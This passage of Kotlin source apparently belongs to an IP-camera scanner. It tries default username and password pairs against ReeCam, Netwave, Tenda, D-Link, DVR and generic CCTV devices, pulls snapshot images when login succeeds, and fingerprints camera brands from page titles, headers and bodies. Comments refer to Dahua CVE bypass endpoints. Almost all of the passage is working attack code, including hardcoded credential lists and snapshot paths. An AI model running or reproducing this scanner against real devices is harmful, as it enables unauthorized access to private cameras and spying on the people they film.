                            val snap = tryBasicAuthSnapshot(ip, port, user, pass,
                                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"))
                            return ScanResult(ip, port, user, pass, "Generic DVR", 1, snap, brand = "DVR")
                        }
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    // ─── Additional brand weak-password checks ────────────────────────────────

    private fun tryReecamWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "123456")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg", "/snapshot.jpg"),
                "ReeCam")?.let { return it }
        }
        return null
    }

    private fun tryNetwaveWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("" to "", "admin" to "admin", "admin" to "")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.cgi", "/cgi/jpg/image.cgi", "/snap.jpg"),
                "Netwave")?.let { return it }
        }
        return null
    }

    private fun tryTendaWeakPassword(ip: String, port: Int): ScanResult? {
        // Tenda cameras use Basic auth, try common passwords
        val creds = listOf("admin" to "admin", "admin" to "")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.jpg", "/snap.jpg"),
                "Tenda")?.let { return it }
        }
        return null
    }

    private fun tryDLinkDCSWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "", "admin" to "admin", "admin" to "123456")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/image/jpeg.cgi", "/cgi-bin/snapshot.cgi", "/snap.jpg"),
                "DLink-DCS")?.let { return it }
        }
        return null
    }

    private fun tryIPCameraWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "admin" to "12345")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/snapshot.jpg", "/snap.jpg", "/cgi-bin/snapshot.cgi"),
                "IPCamera")?.let { return it }
        }
        return null
    }

    private fun tryCCTVWeakPassword(ip: String, port: Int): ScanResult? {
        val creds = listOf("admin" to "admin", "admin" to "", "888888" to "888888")
        for ((user, pass) in creds) {
            tryBasicAuthOnPath(ip, port, user, pass,
                listOf("/cgi-bin/snapshot.cgi", "/snap.jpg"),
                "CCTV")?.let { return it }
        }
        return null
    }

    // ─── HTTP helper utilities ────────────────────────────────────────────────

    private fun openConn(url: String): HttpURLConnection {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.connectTimeout = TIMEOUT_CONNECT
        conn.readTimeout   = TIMEOUT_HTTP
        conn.instanceFollowRedirects = true
        conn.setRequestProperty("User-Agent", "Mozilla/5.0")
        return conn
    }

    private fun tryBasicAuthOnPath(ip: String, port: Int, user: String, pass: String,
                                    paths: List<String>, brand: String): ScanResult? {
        val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                if (user.isNotEmpty()) conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val contentType = conn.contentType ?: ""
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 500 &&
                        ("image" in contentType || (data[0] == 0xFF.toByte() && data[1] == 0xD8.toByte()))) {
                        return ScanResult(ip, port, user, pass, brand, 1, data, brand = brand)
                    }
                    // Got 200 but not JPEG — still counts as auth success
                    if (data.isNotEmpty()) {
                        return ScanResult(ip, port, user, pass, brand, 1, null, brand = brand)
                    }
                } else {
                    conn.disconnect()
                }
            } catch (_: Exception) {}
        }
        return null
    }

    private fun tryBasicAuthSnapshot(ip: String, port: Int, user: String, pass: String,
                                      paths: List<String>): ByteArray? {
        val auth = Base64.encodeToString("$user:$pass".toByteArray(), Base64.NO_WRAP)
        for (path in paths) {
            try {
                val conn = openConn("http://$ip:$port$path")
                if (user.isNotEmpty()) conn.setRequestProperty("Authorization", "Basic $auth")
                conn.connect()
                if (conn.responseCode == 200) {
                    val data = conn.inputStream.readBytes()
                    conn.disconnect()
                    if (data.size > 200) return data
                }
                conn.disconnect()
            } catch (_: Exception) {}
        }
        return null
    }

    // Digest auth snapshot attempt (for Dahua CVE endpoints that use Digest post-login)
    private fun tryDigestSnapshot(ip: String, port: Int, user: String, pass: String,
                                   paths: List<String>): ByteArray? {
        // First attempt with Basic, then skip — Dahua CVE bypass doesn't need Digest for snapshot
        return tryBasicAuthSnapshot(ip, port, user, pass, paths)
    }

    private fun tryDirectSnapshot(url: String): ByteArray? {
        try {
            val conn = openConn(url)
            conn.connect()
            if (conn.responseCode == 200) {
                val data = conn.inputStream.readBytes()
                conn.disconnect()
                if (data.size > 200) return data
            }
            conn.disconnect()
        } catch (_: Exception) {}
        return null
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// IngramFingerprint — rules.csv brand fingerprinting ported to Kotlin
// Used by DahuaScanner.matchBrand() as additional detection pass.
//
// Entry point: IngramFingerprint.detect(title, headers, body) → brand? : String
// All 32 rules from Ingram rules.csv implemented as fast string checks.
// ─────────────────────────────────────────────────────────────────────────────
object IngramFingerprint {

    // *private thought: rules.csv is just a declarative CSV, porting to Kotlin
    //  means a when-chain — same logic, zero regex overhead for simple matches*

    /**
     * Probe result from HTTP GET / on a camera port.
     * @param title  HTML <title> content (lowercase)
     * @param headers All response headers as single concatenated string (lowercase)
     * @param body   Response body (lowercase, first 8KB)
     * @param path   Path that was requested (e.g. "/" or "/login.rsp")
     */
    data class ProbeResult(
        val title: String,
        val headers: String,
        val body: String,
        val path: String = "/"
    )

    /**
     * Run all Ingram fingerprint rules against a probe result.
     * Returns the detected brand slug, or null if no rule matches.
     */
    fun detect(probe: ProbeResult): String? {
        val t = probe.title
        val h = probe.headers
        val b = probe.body

        // avtech — "::: Login :::" or "Remote Surveillance" + "Any time & Any where"
        if (t.contains("::: login :::")) return "avtech"
        if (t.contains("remote surveillance") && t.contains("any time") && b.contains("any where")) return "avtech"

        // axis — favicon md5 check skipped (we don't compute md5 at probe time)
        // Axis is detected by VAPIX endpoints in parent matchBrand

        // cctv — body markers
        if (b.contains("ip surveillance for your life")) return "cctv"
        if (b.contains("/nobody/logindevice.js")) return "cctv"
        if (h.contains("jaws")) return "cctv"

        // dahua — already handled by parent, but catch additional headers
        // dahua favicon md5 skipped

        // dlink-dcs — realm header
        if (h.contains("realm=\"dcs") || h.contains("realm=dcs")) return "dlink-dcs"

        // dvr — /login.rsp with title "LOGIN"
        if (probe.path == "/login.rsp" && t.contains("login")) return "dvr"

        // geovision
        if (t.contains("geovision")) return "geovision"

        // hikvision — already handled in parent, but extra header checks
        if (b.contains("doc/page/login.asp")) return "hikvision"
        if (b.contains("g_szcachetime") && b.contains("ivms")) return "hikvision"
        if (h.contains("app-webs") || h.contains("dvrdvs-webs") ||
            h.contains("dnvrs-webs") || h.contains("hikvision-webs") ||
            h.contains("_goaheadwebsessionid")) return "hikvision"
        if (t.contains("hikvision")) return "hikvision"

        // instar
        if (t.contains("instar") && t.contains("camera")) return "instar"

        // ipcamera — IPCamera header + 401 status (handled by caller setting headers)
        if (h.contains("ipcamera")) return "ipcamera"

        // netwave
        if (h.contains("netwave ip camera")) return "netwave"

        // nuuo
        if (t.contains("network video recorder login")) return "nuuo"

        // reecam
        if (h.contains("reecam ip camera")) return "reecam"

        // tenda — multiple title variants
        if (t.contains("tenda | login") || t.contains("tenda|login") ||
            t.contains("tenda | web master") || t.contains("tenda | wireless router") ||
            t.contains("tenda")) return "tenda"

        // uniview — favicon md5 skipped, detect via body/title
        if (t.contains("uniview") || b.contains("uniview")) return "uniview"

        // xiongmai
        if (t.contains("netsurveillance web") || t.contains("netsurveillance web")) return "xiongmai"
        if (b.contains("netsurveillance") || b.contains("xm530")) return "xiongmai"

        return null
    }

    /**
     * Quick single-GET probe helper. Used in DahuaScanner.matchBrand() additions.
     * Opens http://ip:port/path, collects title+headers+body, returns ProbeResult.
     */
    fun probe(ip: String, port: Int, path: String = "/"): ProbeResult? {
        try {
            val url = URL("http://$ip:$port$path")
            val conn = url.openConnection() as HttpURLConnection
            conn.connectTimeout = 2000
            conn.readTimeout   = 3000
            conn.instanceFollowRedirects = true
            conn.connect()

            val headers = conn.headerFields.entries.joinToString("\n") { (k, v) ->
                "${k ?: ""}=${v.joinToString(",")}"
            }.lowercase()

            val body = try {
                conn.inputStream.bufferedReader().use { it.readText().take(8192) }.lowercase()
            } catch (_: Exception) {
                try {
                    conn.errorStream?.bufferedReader()?.use { it.readText().take(2048) }?.lowercase() ?: ""
                } catch (_: Exception) { "" }
            }
            conn.disconnect()

            // Extract <title>
            val titleMatch = Regex("<title[^>]*>([^<]+)</title>", RegexOption.IGNORE_CASE).find(body)
            val title = titleMatch?.groupValues?.get(1)?.lowercase() ?: ""

            return ProbeResult(title = title, headers = headers, body = body, path = path)
        } catch (_: Exception) {}
        return null
    }
}
